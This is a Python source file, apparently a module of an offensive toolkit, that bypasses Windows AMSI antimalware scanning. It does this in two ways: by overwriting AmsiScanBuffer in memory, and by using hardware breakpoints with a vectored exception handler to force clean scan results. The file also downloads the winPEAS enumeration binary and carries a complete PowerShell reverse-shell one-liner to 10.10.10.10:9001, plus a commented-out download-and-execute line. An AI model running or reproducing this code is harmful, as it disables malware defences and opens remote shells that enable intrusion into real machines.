########################################################
### AMSI Bypass Module
### dev
###
### Original Source: https://gist.github.com/susMdT/360c64c842583f8732cc1c98a60bfd9e
###
########################################################

import ctypes
import ctypes.wintypes
import subprocess
import requests
import threading
import time
#from utils.helper import nstate as nstate
from utils.style import *
from utils.windef import *
from utils.winconst import *

CATEGORY    = 'dev'
DESCRIPTION = 'AMSI Patch Module'

def register_arguments(parser):
            parser.add_argument('-b', '--bypass-method', type=str, required=True, choices=['hw', 'function'], help='The Method to bypass AMSI')
            parser.add_argument('-i', '--input', type=str, required=True, help='Input file, which should run without AMSI protection')

class module:
    Author = 'psycore8'
    Version = '0.0.5'
    DisplayName = 'AMSI-BYPASS'
    pamsi_scan_buffer = any
    pCtx = any
    cpu_context = any
    #vectored_handler = any
    #VectoredHandlerType = any

    VectoredHandlerType = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p)

    def __init__(self, bypass_method, input):
        self.bypass_method = bypass_method
        self.input = input
        
    def msg(self, message_type, MsgVar=None, ErrorExit=False):
        messages = {
            'pre.head'       : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'post.done'      : f'{s_ok} DONE!',
            #'proc.out'       : f'{s_ok} File created in {self.output}\n{s_info} Hash: {self.hash}',
            'mok'            : f'{s_ok} {MsgVar}',
            'mnote'          : f'{s_note} {MsgVar}',
            'merror'         : f'{s_fail} {MsgVar}'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def download_file(self):
        r = requests.get('https://github.com/peass-ng/PEASS-ng/releases/download/20250501-c34edb3c/winPEASany.exe')
        if r.status_code == 200:
             with open('test.exe', 'wb') as f:
                  f.write(r.content)

    def invoke_executable(self, executable):
         #subprocess.call(['powershell', '-Command', f"IEX (New-Object Net.WebClient).DownloadString('{executable}')"])
         subprocess.call(['powershell', '-nop', '-c', "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"])

    def set_bits(self, dw, low_bit, bits, new_val):
         mask = (1 << bits) - 1
         res = (dw & ~(mask << low_bit)) | (new_val << low_bit)
         print(res)
         return res
    
    def enable_breakpoint(self, address, index):
        addr = ctypes.cast(address, ctypes.c_void_p).value
        if index == 0:
            self.cpu_context.Dr0 = addr
        elif index == 1:
            self.cpu_context.Dr1 = addr
        elif index == 2:
            self.cpu_context.Dr2 = addr
        elif index == 3:
            self.cpu_context.Dr3 = addr

        self.cpu_context.Dr7 = self.set_bits(self.cpu_context.Dr7, 16,16, 0)
        self.cpu_context.Dr7 = self.set_bits(self.cpu_context.Dr7, index * 2, 1, 1)

    def handler(self, exception_ptr):
        ep = EXCEPTION_POINTERS.from_address(exception_ptr)
        er = EXCEPTION_RECORD.from_address(ep.pExceptionRecord)
        cr = CONTEXT.from_address(ep.pContextRecords)

        if er.ExceptionCode == EXCEPTION_SINGLE_STEP and er.ExceptionAddress == self.pamsi_scan_buffer:
            ret_addr = ctypes.c_ulonglong.from_address(cr.Rsp).value
            scan_result_ptr = ctypes.c_void_p(cr.Rsp + (6 * 8))
            self.msg('mnote', f'Buffer: 0x{cr.R8:X}')
            self.msg('mnote', f'Scan result: {ctypes.c_int.from_address(scan_result_ptr).value}')

            ctypes.c_int.from_address(scan_result_ptr.value).value = AMSI_RESULT_CLEAN
            cr.Rip = ret_addr
            cr.Rsp += 8
            cr.Rax = 0
            cr.Dr0 = 0
            cr.Dr7 = self.set_bits(cr.Dr7, 0, 1, 0)
            cr.Dr6 = 0
            cr.EFlags = 0
            ctypes.pointer(cr)[0] = cr
            return EXCEPTION_CONTINUE_EXECUTION
        return EXCEPTION_CONTINUE_SEARCH
    
    def patch_function(self):
        kernel32 = ctypes.windll.kernel32
        amsi = ctypes.windll.LoadLibrary('amsi.dll')

        # Adresse von AmsiScanBuffer holen
        amsi_scan_buffer = amsi.AmsiScanBuffer
        amsi_scan_buffer.restype = HRESULT
        amsi_address = ctypes.cast(amsi_scan_buffer, ctypes.c_void_p).value

        #print(f"[+] AmsiScanBuffer address: {hex(amsi_address)}")
        self.msg('mnote', f'AmsiScanBuffer address: {hex(amsi_address)}')

        # 64-bit Patch: xor rax, rax; ret
        patch = b"\x48\x31\xc0\xc3"

        # Speicherrechte ändern (PAGE_EXECUTE_READWRITE)
        old_protect = ctypes.wintypes.DWORD()
        if kernel32.VirtualProtect(
            ctypes.c_void_p(amsi_address),
            len(patch),
            0x40,  # PAGE_EXECUTE_READWRITE
            ctypes.byref(old_protect)
        ):
            # Patch schreiben
            ctypes.memmove(amsi_address, patch, len(patch))
            #print("[+] AMSI patch erfolgreich (64-bit).")
            self.msg('mok', 'AMSI Patch successful')
        else:
            #print("[-] Speicherrechte konnten nicht geändert werden.")
            self.msg('merror', 'Memory access rights not changed!', True)
    
    def setup_bypass(self):
        LPPROC_THREAD_ATTRIBUTE_LIST = LPVOID
        siex = STARTUPINFOEX()
        bytes_written = SIZE_T()
        #context = CONTEXT()
        oldprotect = USHORT(0)
        si = STARTUPINFO()
        pi = PROCESS_INFORMATION()
        amsi_base = LoadLibraryA(b'amsi.dll')
        self.pamsi_scan_buffer = GetProcAddress(amsi_base, b'AmsiScanBuffer')
        #print(hex(self.pamsi_scan_buffer))
        self.msg('mok', f'AmsiScanBuffer found at {hex(self.pamsi_scan_buffer)}')
        process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE
        success = CreateProcess(None, self.input, None, None, False, process_flags, None, None, ctypes.byref(si), ctypes.byref(pi))
        if not success:
             self.msg('merror', 'CreateProcess failed', True)
        handler_ptr = self.VectoredHandlerType(self.handler)
        #AddVectoredExceptionHandler(1, pi.hThread) 
        if AddVectoredExceptionHandler(1, handler_ptr) == None:
             self.msg('merror', 'AddVectoredExceptionHandler failed', True)
        self.cpu_context = CONTEXT()
        self.cpu_context.ContextFlags = CONTEXT64_ALL
        self.pCtx = ctypes.pointer(self.cpu_context)
        #self.cpu_context = ctx
        
        #thread_handle = ctypes.c_void_p(-2 & 0XFFFFFFFFFFFFFFFF)
        print(pi.dwProcessId)
        status = GetThreadContext(pi.hThread, self.pCtx)
        if status == 0:
             self.msg('merror', f'GetThreadContext error: {ctypes.get_last_error()}', True)
        #ctx = self.pCtx.contents
        self.enable_breakpoint(self.pamsi_scan_buffer, 0)
        status = SetThreadContext(pi.hThread, self.pCtx)
        if status == 0:
             self.msg('merror', f'SetThreadContext error: {ctypes.get_last_error()}', True)
        ResumeThread(pi.hThread)

        CloseHandle(pi.hThread)
        CloseHandle(pi.hProcess)

    def SetupBypass(self):
        amsi_base = LoadLibraryA(b'amsi.dll')
        self.pamsi_scan_buffer = GetProcAddress(amsi_base, b'AmsiScanBuffer')
        self.msg('mok', f'AmsiScanBuffer found at {hex(self.pamsi_scan_buffer)}')
        handler_ptr = self.VectoredHandlerType(self.handler)
        if AddVectoredExceptionHandler(1, handler_ptr) == None:
             self.msg('merror', f'AddVectoredExceptionHandler failed with error: {ctypes.get_last_error()}', True)
        self.cpu_context = CONTEXT()
        self.cpu_context.ContextFlags = CONTEXT64_ALL
        self.pCtx = ctypes.pointer(self.cpu_context)
        
        #thread_handle = ctypes.c_void_p(-2 & 0XFFFFFFFFFFFFFFFF)
        t = threading.Thread(target=self.download_file)
        t.start()
        time.sleep(0.5)


        # Thread starten, suspenden und bearbeiten

        tid = GetCurrentThreadId()

        # Handle für den aktuellen Thread öffnen
        thread_handle = OpenThread(THREAD_ALL_ACCESS, False, tid)

        if not thread_handle:
            raise ctypes.WinError()

        # Thread anhalten
        SuspendThread(thread_handle)
        status = GetThreadContext(thread_handle, ctypes.byref(self.pCtx))
        if status == 0:
             self.msg('merror', f'GetThreadContext error: {ctypes.get_last_error()}', True)
             #raise Exception(f"GetThreadContext error: {ctypes.get_last_error()}")
        #ctx = self.pCtx.contents
        self.enable_breakpoint(self.pamsi_scan_buffer, 0)
        status = SetThreadContext(thread_handle, self.pCtx)
        if status == 0:
             self.msg('merror', f'SetThreadContext error: {ctypes.get_last_error()}', True)
        ResumeThread(thread_handle)
             #raise Exception(f"SetThreadContext error: {ctypes.get_last_error()}")

    def process(self):
        m = self.msg
        m('pre.head')
        #pCtx = ctypes.memset(ctypes.byref(context64), 0, ctypes.sizeof(context64))
        #self.vectored_handler = self.VectoredHandlerType(self.handler)
        if self.bypass_method == 'hw':
            self.SetupBypass()
        elif self.bypass_method == 'function':
            self.patch_function()
            self.download_file()
            #self.invoke_executable('https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1')
            #self.download_file()
        #self.setup_bypass()
        # r = requests.get('https://github.com/peass-ng/PEASS-ng/releases/download/20250501-c34edb3c/winPEASany.exe')
        # if r.status_code == 200:
        #      with open('test.exe', 'wb') as f:
        #           f.write(r.content)
        #subprocess.run([self.input])
        m('post.done')
        # Process Input

